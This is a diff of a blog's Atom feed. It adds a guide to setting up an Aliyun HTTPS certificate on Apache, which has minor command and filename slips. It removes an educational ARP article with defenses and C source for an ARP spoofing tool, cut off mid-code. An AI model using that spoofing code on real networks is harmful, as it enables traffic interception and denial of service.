@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.evilclay.com/"/>
-  <updated>2017-06-11T14:20:02.465Z</updated>
+  <updated>2017-06-12T12:40:15.581Z</updated>
   <id>http://www.evilclay.com/</id>
   
   <author>
@@ -14,6 +14,128 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>部署阿里云免费HTTPS证书笔记</title>
+    <link href="http://www.evilclay.com/2017/06/12/%E9%83%A8%E7%BD%B2%E9%98%BF%E9%87%8C%E4%BA%91%E5%85%8D%E8%B4%B9HTTPS%E8%AF%81%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
+    <id>http://www.evilclay.com/2017/06/12/部署阿里云免费HTTPS证书笔记/</id>
+    <published>2017-06-12T12:39:11.000Z</published>
+    <updated>2017-06-12T12:40:15.581Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><pre><code>Ubuntu 16.04
+Apache2
+</code></pre><h2 id="设置域名A记录"><a href="#设置域名A记录" class="headerlink" title="设置域名A记录"></a>设置域名A记录</h2><blockquote>
+<p>注意：已经存在的网站不需要这一步操作。</p>
+</blockquote>
+<p>这一步是用来把 域名 绑定到指定的 IP 上，访问域名会直接返回 IP 的 Web 默认路径。</p>
+<p>在控制台新增加一条域名(x.evilclay.com)的A记录解析：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/https/a_record.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h2 id="新建虚拟主机"><a href="#新建虚拟主机" class="headerlink" title="新建虚拟主机"></a>新建虚拟主机</h2><blockquote>
+<p>注意：已经存在的网站也不需要这一步操作。</p>
+</blockquote>
+<p>之前写的笔记 <a href="http://www.evilclay.com/2017/03/13/Apache绑定多域名%20or%20多端口配置命令">Apache绑定多域名or多端口配置命令</a> 中的多域名相关配置写的就是这一部分的配置，在这里直接搞吧。</p>
+<p>新建 x.evilclay.com 作为新的虚拟主机。</p>
+<p>在 /etc/apache2/sites-enable/目录下新建 x.evilclay.com.conf 配置文件，内容如下：</p>
+<pre><code>&lt;VirtualHost *:80&gt;
+ServerName x.evilclay.com  # 域名
+ServerAdmin webmaster@localhost
+DocumentRoot /var/www/html/x.evilclay.com  # 虚拟主机目录
+ErrorLog ${APACHE_LOG_DIR}/error_x.evilclay.com.log
+CustomLog ${APACHE_LOG_DIR}/access_x.evilclay.com.log combined
+&lt;/VirtualHost&gt;
+</code></pre><p>为了测试是否成功 在 /var/www/html 中创建 x.evilclay.com 目录，新建 hello.txt 文件用来测试配置是否成功，内容如下：</p>
+<pre><code>ubuntu@evilclay:/var/www/html/x.evilclay.com$ cat hello.txt
+Hello Baby!
+</code></pre><p>重启 apache2 使用浏览器访问 <a href="http://x.evilclay.com/hello.txt" target="_blank" rel="external">http://x.evilclay.com/hello.txt</a> ，显示如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/https/http_ok.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以看出新建的虚拟主机 x.evilclay.com 已经可以成功解析。</p>
+<h2 id="申请阿里云免费证书"><a href="#申请阿里云免费证书" class="headerlink" title="申请阿里云免费证书"></a>申请阿里云免费证书</h2><ul>
+<li>登录：阿里云控制台，产品与服务，证书服务，购买证书。</li>
+<li>购买：证书类型选择 免费型DV SSL，然后完成购买。</li>
+<li>补全：在 我的证书 控制台，找到购买的证书，在操作栏里选择 补全。填写证书相关信息，在这一步，我的域名填写成 x.evilclay.com，对应修改成上一部你的域名。</li>
+<li>域名验证：可以选择 DNS，如果域名用了阿里云的 DNS 服务，再勾选一下 证书绑定的域名在 阿里云的云解析。</li>
+<li>上传：系统生成 CSR，点一下 创建。</li>
+<li>提交审核。</li>
+</ul>
+<p>根据提示，24小时内会给出审核结果，审核通过如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/https/cert_aliyun.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>点击操作-下载按钮，把证书的相关密钥下载到本地，待会需要上传到服务器上。</p>
+<p>主要包含：</p>
+<ul>
+<li>证书文件214144412712457.pem</li>
+<li>证书私钥文件214144412712457.key</li>
+<li>证书公钥文件public.pem</li>
+<li>证书链文件chain.pem。</li>
+</ul>
+<h2 id="服务器配置HTTPS证书"><a href="#服务器配置HTTPS证书" class="headerlink" title="服务器配置HTTPS证书"></a>服务器配置HTTPS证书</h2><p>登陆到服务器上，先安装HTTPS证书相关库：</p>
+<pre><code>sudo apt-get install openssl
+</code></pre><p>之后在 /etc/apache2 目录下新建 cert 目录，并把刚这四个文件上传到该目录。</p>
+<pre><code>sudo cd /etc/apache2  
+sudo mkdir cert
+</code></pre><p>启用 Apache 的 SSL 模块：</p>
+<pre><code>sudo a2enmod ssl
+</code></pre><p>再配置服务器域名绑定：</p>
+<pre><code>sudo cp /etc/apache2/sites-enabled/x.evilclay.com /etc/apache2/sites-enabled/x.evilclay.com_ssl    
+sudo vim x.evilclay.com_ssl
+</code></pre><p>在<virtualhost *:80="">段中，DocumentRoot一行的下方加入内容：</virtualhost></p>
+<pre><code># 添加 SSL 协议支持协议，去掉不安全的协议
+SSLProtocol TLSv1 TLSv1.1 TLSv1.2
+# 修改加密套件如下
+SSLCipherSuite ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4
+# 证书公钥配置
+SSLCertificateFile /etc/apache2/cert/public.pem
+# 证书私钥配置
+SSLCertificateKeyFile /etc/apache2/cert/214144412790737.key
+# 证书链配置，如果该属性开头有 &apos;#&apos;字符，请删除掉
+SSLCertificateChainFile /etc/apache2/cert/chain.pem
+</code></pre><p>端口修改为：443，即<virtualhost *:443="">(ssl的端口)</virtualhost></p>
+<p> 重启 Apache2, 访问 <a href="https://x.evilclay.com/hello.txt" target="_blank" rel="external">https://x.evilclay.com/hello.txt</a> 再次进行测试：</p>
+<p> <img src="http://7xku36.com1.z0.glb.clouddn.com/https/https_ok.png" alt=""></p>
+<p> 至此，从新建虚拟主机到配置HTTPS证书已经完成。</p>
+<h2 id="HTTP请求重定向HTTPS"><a href="#HTTP请求重定向HTTPS" class="headerlink" title="HTTP请求重定向HTTPS"></a>HTTP请求重定向HTTPS</h2><p>在配置文件里对 80 端口的流量做一个重定向即可：</p>
+<pre><code>vim /etc/apache2/sites-available/x.evilclay.com.conf
+
+//在&lt;VirtualHost *:80&gt;&lt;/VirtualHost&gt; 标签内加入下面一行
+Redirect permanent / https://x.evilclay.com/
+</code></pre><p>今后访问 <a href="http://x.evilclay.com" target="_blank" rel="external">http://x.evilclay.com</a> 会自动跳转到 <a href="https://x.evilclay.com/，确保所有网站流量走" target="_blank" rel="external">https://x.evilclay.com/，确保所有网站流量走</a> HTTPS 通讯。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a href="https://yundun.console.aliyun.com/" target="_blank" rel="external">https://yundun.console.aliyun.com/</a></li>
+<li><a href="https://ninghao.net/blog/4449" target="_blank" rel="external">https://ninghao.net/blog/4449</a></li>
+<li><a href="http://blog.csdn.net/trh0123/article/details/70932448" target="_blank" rel="external">http://blog.csdn.net/trh0123/article/details/70932448</a></li>
+<li><a href="https://www.howtoing.com/apache-redirect-http-to-https/" target="_blank" rel="external">https://www.howtoing.com/apache-redirect-http-to-https/</a></li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;系统环境&quot;&gt;&lt;a href=&quot;#系统环境&quot; class=&quot;headerlink&quot; title=&quot;系统环境&quot;&gt;&lt;/a&gt;系统环境&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;Ubuntu 16.04
+Apache2
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;设置域名A记录&quot;&gt;&lt;a 
+    
+    </summary>
+    
+    
+      <category term="HTTPS" scheme="http://www.evilclay.com/tags/HTTPS/"/>
+    
+  </entry>
   
   <entry>
     <title>SOCKS4反向代理实验</title>
@@ -1473,147 +1595,6 @@ sudo adduser ankauser sudo
     
     
       <category term="sudo" scheme="http://www.evilclay.com/tags/sudo/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ARP协议分析与漏洞利用</title>
-    <link href="http://www.evilclay.com/2016/10/28/ARP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
-    <id>http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/</id>
-    <published>2016-10-27T16:28:12.000Z</published>
-    <updated>2016-10-27T16:58:01.850Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote>
-<p>好早前写的一篇文章了，突然翻到，看到C语言写的代码我羞涩了 xD</p>
-</blockquote>
-<h2 id="ARP-协议是什么"><a href="#ARP-协议是什么" class="headerlink" title="ARP 协议是什么"></a>ARP 协议是什么</h2><p>局域网通信中需要知道目标主机的MAC地址才能与其建立连接。</p>
-<p>ARP是地址解析协议，根据目标主机的IP地址获取其MAC地址。</p>
-<h2 id="ARP-工作流程"><a href="#ARP-工作流程" class="headerlink" title="ARP 工作流程"></a>ARP 工作流程</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage1.png" alt="ARP工作流程" title="">
-                </div>
-                <div class="image-caption">ARP工作流程</div>
-            </figure>
-<p>如图所示局域网双方通信时：</p>
-<p>首先检测ARP缓存表，缓存表没有目标IP-MAC映射时需要先向全网发送目的IP为192.168.1.xxx </p>
-<p>目的MAC为FF-FF-FF-FF-FF-FF的全网广播，当局域网中IP为192.168.1.xxx的主机收到请求时，</p>
-<p>发送一个包含自己IP-MAC的响应包给请求主机，请求主机收到响应包，解析出IP对应的MAC，写入自己的ARP缓存表。</p>
-<p>继而，双方可以建立正常的通信。</p>
-<p>以上是建立的是动态ARP映射条目，每项条目有预定的生存时间。</p>
-<blockquote>
-<p>Windows系统ARP表项生存时间2min。<br>Linux系统ARP表项生存时间30s。</p>
-</blockquote>
-<p>可以看出ARP缓存表是双方通信的基础，这个ARP缓存表是否是可以“手动”修改的？  当然可以。 </p>
-<p>在系统CMD下，有ARP配置命令：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage2.png" alt="ARP命令" title="">
-                </div>
-                <div class="image-caption">ARP命令</div>
-            </figure>
-<p>可以直接管理的当前系统的ARP缓存表。</p>
-<h2 id="ARP协议的漏洞"><a href="#ARP协议的漏洞" class="headerlink" title="ARP协议的漏洞"></a>ARP协议的漏洞</h2><p>主机在更新ARP缓存表时并不检测收到的ARP响应包的正确性，直接根据响应包的信息对缓存表进行更新。</p>
-<p>无论之前是否发过ARP请求，再收到ARP响应包后都会对ARP缓存表进行更新。</p>
-<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>I． 攻击机构造虚假ARP响应包 发送给 目标主机。</p>
-<p>II．目标主机更新本地ARP缓存表</p>
-<p>III．目标主机的通信收到影响（断网，MIT攻击）。</p>
-<h2 id="攻击Demo"><a href="#攻击Demo" class="headerlink" title="攻击Demo"></a>攻击Demo</h2><p>1、 攻击前目标主机能够正常上网</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage3.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage4.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<p>2、 运行攻击程序 对 目标主机进行ARP 欺骗攻击<br>主要是构造四个参数：源IP，MAC，目标IP，MAC</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage5.png" alt="run_arp_attack" title="">
-                </div>
-                <div class="image-caption">run_arp_attack</div>
-            </figure>
-<ol>
-<li>Wireshark 抓数据包</li>
-</ol>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage6.png" alt="wire" title="">
-                </div>
-                <div class="image-caption">wire</div>
-            </figure>
-<p>数据包的详细内容</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage7.png" alt="packet" title="">
-                </div>
-                <div class="image-caption">packet</div>
-            </figure>
-<ol>
-<li>攻击效果</li>
-</ol>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage8.png" alt="attack_res" title="">
-                </div>
-                <div class="image-caption">attack_res</div>
-            </figure>
-<p>请求网关测试</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage9.png" alt="req_gateway" title="">
-                </div>
-                <div class="image-caption">req_gateway</div>
-            </figure>
-<p>请求百度网站测试</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage10.png" alt="req_baidu" title="">
-                </div>
-                <div class="image-caption">req_baidu</div>
-            </figure>
-<h2 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h2><p>静态添加ARP缓存表条目，避免ARP条目的恶意被动更新。</p>
-<pre><code>CMD下：arp -s 目标IP 目标MAC
-</code></pre><p>Win8/10下，该命令权限不够，用之下方法绑定</p>
-<pre><code>netsh i i show in
-netsh -c i i add neighbors 4 192.168.1.1 0c-72-2c-25-ca-66
-// 4为 第一条命令回显的本地连接网卡Idx号
-</code></pre><p>结果如图：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage11.png" alt="def_res" title="">
-                </div>
-                <div class="image-caption">def_res</div>
-            </figure>
-<h2 id="攻击程序代码-C语言"><a href="#攻击程序代码-C语言" class="headerlink" title="攻击程序代码(C语言)"></a>攻击程序代码(C语言)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">// ARP攻击程序源代码</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pcap.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;packet32.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddndis.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MY_ARP_CHEAT_INCLUDE_H</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_ARP_CHEAT_INCLUDE_H</span></div><div class="line"></div><div class="line"><span class="comment">//字节对齐必须是1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack (1)</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ethernet_head</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> dest_mac[<span class="number">6</span>]; <span class="comment">//目标主机MAC地址</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> source_mac[<span class="number">6</span>]; <span class="comment">//源端MAC地址</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> eh_type; <span class="comment">//以太网类型</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arp_head</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> hardware_type; <span class="comment">//硬件类型：以太网接口类型为1</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> protocol_type; <span class="comment">//协议类型：IP协议类型为0X0800</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> add_len; <span class="comment">//硬件地址长度：MAC地址长度为6B</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> pro_len; <span class="comment">//协议地址长度：IP地址长度为4B</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> option; <span class="comment">//操作：ARP请求为1，ARP应答为2</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> sour_addr[<span class="number">6</span>]; <span class="comment">//源MAC地址：发送方的MAC地址</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> sour_ip; <span class="comment">//源IP地址：发送方的IP地址</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> dest_addr[<span class="number">6</span>]; </div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> dest_ip; </div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> padding[<span class="number">18</span>];</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arp_packet</span> //最终<span class="title">arp</span>包结构</span></div><div class="line">&#123;</div><div class="line">	ethernet_head eth; <span class="comment">//以太网头部</span></div><div class="line">	arp_head arp; <span class="comment">//arp数据包头部</span></div><div class="line">&#125;;</div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack ()</span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="title">BuildArpPacket</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* source_mac, <span class="keyword">unsigned</span> <span class="keyword">char</span>* dest_mac,</span></span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> src_ip, <span class="keyword">unsigned</span> <span class="keyword">long</span> dest_ip);</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> errbuf[PCAP_ERRBUF_SIZE];   <span class="comment">//错误缓冲区</span></div><div class="line">	<span class="keyword">int</span> times;	<span class="comment">//	发送次数</span></div><div class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *packet;	<span class="comment">//ARP包</span></div><div class="line">	<span class="keyword">pcap_t</span> *adhandle;	<span class="comment">//一个pcap实例</span></div><div class="line">	<span class="keyword">pcap_if_t</span> *alldevs;	<span class="comment">//	全部网卡列表</span></div><div class="line">	<span class="keyword">pcap_if_t</span> *device;	<span class="comment">//	一个网卡</span></div><div class="line">	<span class="keyword">int</span> inum;	<span class="comment">//	用户选择的网卡序号</span></div><div class="line"></div><div class="line">	<span class="comment">//	获得本机网卡列表</span></div><div class="line">	<span class="keyword">if</span> (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, <span class="literal">NULL</span>, &amp;alldevs, errbuf) == <span class="number">-1</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error in pcap_findalldevs: %s\n"</span>, errbuf);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//	打印网卡列表</span></div><div class="line">	<span class="keyword">for</span> (device = alldevs; device; device = device-&gt;next)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d"</span>, ++i);</div><div class="line">		<span class="keyword">if</span> (device-&gt;description)</div><div class="line">			<span class="built_in">printf</span>(<span class="string">". %s\n"</span>, device-&gt;description);</div><div class="line">		<span class="keyword">else</span></div><div class="line">			<span class="built_in">printf</span>(<span class="string">". No description available\n"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//	如果没有发现网卡</span></div><div class="line">	<span class="keyword">if</span> (i == <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"\nNo interfaces found! Make sure WinPcap is installed.\n"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//	请用户选择一个网卡</span></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Enter the interface number (1-%d):"</span>, i);</div><div class="line">	scanf_s(<span class="string">"%d"</span>, &amp;inum);</div><div class="line"></div><div class="line">	<span class="comment">//	移动指针到用户选择的网卡</span></div><div class="line">	<span class="keyword">for</span> (device = alldevs, i = <span class="number">0</span>; i&lt; inum - <span class="number">1</span>; device = device-&gt;next, i++);</div><div class="line"></div><div class="line">	<span class="keyword">char</span> chs_src_ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">	<span class="keyword">char</span> chs_dest_ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ul_src_ip = <span class="number">0u</span>;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ul_dest_ip = <span class="number">0u</span>;</div><div class="line">	getchar();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Input the src ip(192.168.1.1):"</span>);</div><div class="line">	gets_s(chs_src_ip);</div><div class="line">	</div><div class="line">	ul_src_ip = inet_addr(chs_src_ip);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Input the dest ip(192.168.1.100):"</span>);</div><div class="line">	gets_s(chs_dest_ip);</div><div class="line">	ul_dest_ip = inet_addr(chs_dest_ip);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> uchs_src_mac[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> uchs_dest_mac[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Input source mac address(30 AD 23 A3 FC CD):"</span>);</div><div class="line">	scanf_s(<span class="string">"%x%x%x%x%x%x"</span>, &amp;uchs_src_mac[<span class="number">0</span>], &amp;uchs_src_mac[<span class="number">1</span>], &amp;uchs_src_mac[<span class="number">2</span>],</div><div class="line">		&amp;uchs_src_mac[<span class="number">3</span>], &amp;uchs_src_mac[<span class="number">4</span>], &amp;uchs_src_mac[<span class="number">5</span>]);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Input dest mac address(30 AD 23 A3 FC CD):"</span>);</div><div class="line">	scanf_s(<span class="string">"%x%x%x%x%x%x"</span>, &amp;uchs_dest_mac[<span class="number">0</span>], &amp;uchs_dest_mac[<span class="number">1</span>], &amp;uchs_dest_mac[<span class="number">2</span>],</div><div class="line">		&amp;uchs_dest_mac[<span class="number">3</span>], &amp;uchs_dest_mac[<span class="number">4</span>], &amp;uchs_dest_mac[<span class="number">5</span>]);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Input send times:"</span>);</div><div class="line">	scanf_s(<span class="string">"%d"</span>, &amp;times);</div><div class="line">	packet = BuildArpPacket(uchs_src_mac, uchs_dest_mac, ul_src_ip, ul_dest_ip);</div><div class="line"></div><div class="line">	<span class="comment">/* 打开网卡 */</span></div><div class="line">	<span class="keyword">if</span> ((adhandle = pcap_open(device-&gt;name,          <span class="comment">// name of the device</span></div><div class="line">		<span class="number">65536</span>,            <span class="comment">// portion of the packet to capture</span></div><div class="line">		<span class="number">0</span>,                <span class="comment">//open flag</span></div><div class="line">		<span class="number">1000</span>,             <span class="comment">// read timeout</span></div><div class="line">		<span class="literal">NULL</span>,             <span class="comment">// authentication on the remote machine</span></div><div class="line">		errbuf            <span class="comment">// error buffer</span></div><div class="line">		)) == <span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nUnable to open the adapter. %s is not supported by WinPcap\n"</span>,</div><div class="line">			device-&gt;name);</div><div class="line">		<span class="comment">/* Free the device list */</span></div><div class="line">		pcap_freealldevs(alldevs);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//构建假的ARP请求包，达到本机伪装成给定的IP地址的目的</span></div><div class="line">	packet = BuildArpPacket(uchs_src_mac, uchs_dest_mac, ul_src_ip, ul_dest_ip);</div><div class="line">	<span class="keyword">int</span> j = <span class="number">1</span>;</div><div class="line">	<span class="keyword">while</span> (j &lt;= times)</div><div class="line">	&#123;</div><div class="line">		pcap_sendpacket(adhandle, packet, <span class="number">60</span>);</div><div class="line">		Sleep(<span class="number">100</span>);		</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d:%s--&gt;%s\n"</span>,j, chs_src_ip,chs_dest_ip);</div><div class="line">		j++;</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"end!!!\n"</span>);</div><div class="line">	getchar();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="title">BuildArpPacket</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* source_mac, <span class="keyword">unsigned</span> <span class="keyword">char</span>* 